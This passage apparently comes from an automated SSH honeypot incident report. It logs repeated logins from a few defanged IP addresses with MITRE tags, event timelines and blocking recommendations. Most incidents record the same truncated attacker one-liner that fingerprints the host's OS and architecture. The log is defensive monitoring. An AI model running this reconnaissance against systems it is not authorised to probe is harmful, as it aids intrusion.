| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:17:09` | `cowrie.session.connect` |
| `2026-07-06 14:17:14` | `cowrie.client.version` |
| `2026-07-06 14:17:14` | `cowrie.client.kex` |
| `2026-07-06 14:17:37` | `cowrie.login.success` |
| `2026-07-06 14:17:46` | `cowrie.session.params` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:46` | `cowrie.command.success` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:46` | `cowrie.command.input` |
| `2026-07-06 14:17:51` | `cowrie.log.closed` |
| `2026-07-06 14:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a683fe753ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:17 |
| **Last Seen** | 2026-07-06 14:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:17:22` | `cowrie.session.connect` |
| `2026-07-06 14:17:23` | `cowrie.client.version` |
| `2026-07-06 14:17:23` | `cowrie.client.kex` |
| `2026-07-06 14:17:26` | `cowrie.login.success` |
| `2026-07-06 14:17:28` | `cowrie.session.params` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.command.success` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.command.input` |
| `2026-07-06 14:17:28` | `cowrie.log.closed` |
| `2026-07-06 14:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e1901cec1f4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:18 |
| **Last Seen** | 2026-07-06 14:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:18:42` | `cowrie.session.connect` |
| `2026-07-06 14:18:43` | `cowrie.client.version` |
| `2026-07-06 14:18:43` | `cowrie.client.kex` |
| `2026-07-06 14:18:45` | `cowrie.login.success` |
| `2026-07-06 14:18:47` | `cowrie.session.params` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:47` | `cowrie.command.success` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:47` | `cowrie.command.input` |
| `2026-07-06 14:18:48` | `cowrie.log.closed` |
| `2026-07-06 14:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5ae49b72b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:19 |
| **Last Seen** | 2026-07-06 14:19 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:19:05` | `cowrie.session.connect` |
| `2026-07-06 14:19:10` | `cowrie.client.version` |
| `2026-07-06 14:19:10` | `cowrie.client.kex` |
| `2026-07-06 14:19:32` | `cowrie.login.success` |
| `2026-07-06 14:19:43` | `cowrie.session.params` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:43` | `cowrie.command.success` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:43` | `cowrie.command.input` |
| `2026-07-06 14:19:46` | `cowrie.log.closed` |
| `2026-07-06 14:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5191cc345c40

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 14:20 |
| **Last Seen** | 2026-07-06 14:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:20:01` | `cowrie.session.connect` |
| `2026-07-06 14:20:02` | `cowrie.client.version` |
| `2026-07-06 14:20:02` | `cowrie.client.kex` |
| `2026-07-06 14:20:05` | `cowrie.login.success` |
| `2026-07-06 14:20:08` | `cowrie.session.params` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.command.success` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.command.input` |
| `2026-07-06 14:20:08` | `cowrie.log.closed` |
| `2026-07-06 14:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c0d0ad2c038

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:20 |
| **Last Seen** | 2026-07-06 14:21 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:20:49` | `cowrie.session.connect` |
| `2026-07-06 14:20:54` | `cowrie.client.version` |
| `2026-07-06 14:20:54` | `cowrie.client.kex` |
| `2026-07-06 14:21:09` | `cowrie.login.success` |
| `2026-07-06 14:21:17` | `cowrie.session.params` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:17` | `cowrie.command.success` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:17` | `cowrie.command.input` |
| `2026-07-06 14:21:20` | `cowrie.log.closed` |
| `2026-07-06 14:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aad41f5bad5

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-06 14:21 |
| **Last Seen** | 2026-07-06 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:21:03` | `cowrie.session.connect` |
| `2026-07-06 14:21:03` | `cowrie.client.version` |
| `2026-07-06 14:21:03` | `cowrie.client.kex` |
| `2026-07-06 14:21:04` | `cowrie.login.success` |
| `2026-07-06 14:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cad13dd273b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-06 14:21 |
| **Last Seen** | 2026-07-06 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:21:03` | `cowrie.session.connect` |
| `2026-07-06 14:21:03` | `cowrie.client.version` |
| `2026-07-06 14:21:04` | `cowrie.client.kex` |
| `2026-07-06 14:21:05` | `cowrie.login.success` |
| `2026-07-06 14:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fd8b14bb762

| Field | Detail |
|---|---|
| **Source IP** | `130.211.64[.]11` |
| **First Seen** | 2026-07-06 14:21 |
| **Last Seen** | 2026-07-06 14:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:21:44` | `cowrie.session.connect` |
| `2026-07-06 14:21:44` | `cowrie.login.success` |
| `2026-07-06 14:21:45` | `cowrie.session.params` |
| `2026-07-06 14:21:45` | `cowrie.command.input` |
| `2026-07-06 14:21:45` | `cowrie.command.input` |
| `2026-07-06 14:21:45` | `cowrie.command.failed` |
| `2026-07-06 14:21:45` | `cowrie.command.input` |
| `2026-07-06 14:21:45` | `cowrie.log.closed` |
| `2026-07-06 14:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.64[.]11` to AbuseIPDB if not already reported
- [ ] Block `130.211.64[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d282f5e162b6

| Field | Detail |
|---|---|
| **Source IP** | `130.211.64[.]11` |
| **First Seen** | 2026-07-06 14:21 |
| **Last Seen** | 2026-07-06 14:22 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:21:58` | `cowrie.session.connect` |
| `2026-07-06 14:21:58` | `cowrie.login.success` |
| `2026-07-06 14:21:58` | `cowrie.session.params` |
| `2026-07-06 14:21:58` | `cowrie.command.input` |
| `2026-07-06 14:21:58` | `cowrie.command.failed` |
| `2026-07-06 14:22:30` | `cowrie.log.closed` |
| `2026-07-06 14:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.64[.]11` to AbuseIPDB if not already reported
- [ ] Block `130.211.64[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-402897c629aa

| Field | Detail |
|---|---|
| **Source IP** | `130.211.64[.]11` |
| **First Seen** | 2026-07-06 14:22 |
| **Last Seen** | 2026-07-06 14:22 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:22:00` | `cowrie.session.connect` |
| `2026-07-06 14:22:00` | `cowrie.login.success` |
| `2026-07-06 14:22:00` | `cowrie.session.params` |
| `2026-07-06 14:22:00` | `cowrie.command.input` |
| `2026-07-06 14:22:30` | `cowrie.log.closed` |
| `2026-07-06 14:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.64[.]11` to AbuseIPDB if not already reported
- [ ] Block `130.211.64[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92ec9bf82b41

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:22 |
| **Last Seen** | 2026-07-06 14:22 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:22:21` | `cowrie.session.connect` |
| `2026-07-06 14:22:23` | `cowrie.client.version` |
| `2026-07-06 14:22:23` | `cowrie.client.kex` |
| `2026-07-06 14:22:38` | `cowrie.login.success` |
| `2026-07-06 14:22:45` | `cowrie.session.params` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:45` | `cowrie.command.success` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:45` | `cowrie.command.input` |
| `2026-07-06 14:22:47` | `cowrie.log.closed` |
| `2026-07-06 14:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99be279dc609

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:23 |
| **Last Seen** | 2026-07-06 14:24 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:23:48` | `cowrie.session.connect` |
| `2026-07-06 14:23:55` | `cowrie.client.version` |
| `2026-07-06 14:23:55` | `cowrie.client.kex` |
| `2026-07-06 14:24:15` | `cowrie.login.success` |
| `2026-07-06 14:24:27` | `cowrie.session.params` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:27` | `cowrie.command.success` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:27` | `cowrie.command.input` |
| `2026-07-06 14:24:31` | `cowrie.log.closed` |
| `2026-07-06 14:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0d728c7e27

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 14:24 |
| **Last Seen** | 2026-07-06 14:24 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:24:40` | `cowrie.session.connect` |
| `2026-07-06 14:24:42` | `cowrie.client.version` |
| `2026-07-06 14:24:42` | `cowrie.client.kex` |
| `2026-07-06 14:24:48` | `cowrie.login.success` |
| `2026-07-06 14:24:51` | `cowrie.session.params` |
| `2026-07-06 14:24:51` | `cowrie.command.input` |
| `2026-07-06 14:24:52` | `cowrie.log.closed` |
| `2026-07-06 14:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd9fdc0336ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:25 |
| **Last Seen** | 2026-07-06 14:26 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:25:42` | `cowrie.session.connect` |
| `2026-07-06 14:25:46` | `cowrie.client.version` |
| `2026-07-06 14:25:46` | `cowrie.client.kex` |
| `2026-07-06 14:26:07` | `cowrie.login.success` |
| `2026-07-06 14:26:18` | `cowrie.session.params` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:18` | `cowrie.command.success` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:18` | `cowrie.command.input` |
| `2026-07-06 14:26:21` | `cowrie.log.closed` |
| `2026-07-06 14:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07b0a7989cb0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 14:27 |
| **Last Seen** | 2026-07-06 14:28 |
| **Session Duration** | 42s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 14:27:49` | `cowrie.session.connect` |
| `2026-07-06 14:27:52` | `cowrie.client.version` |
| `2026-07-06 14:27:52` | `cowrie.client.kex` |
| `2026-07-06 14:28:16` | `cowrie.login.success` |
| `2026-07-06 14:28:27` | `cowrie.session.params` |
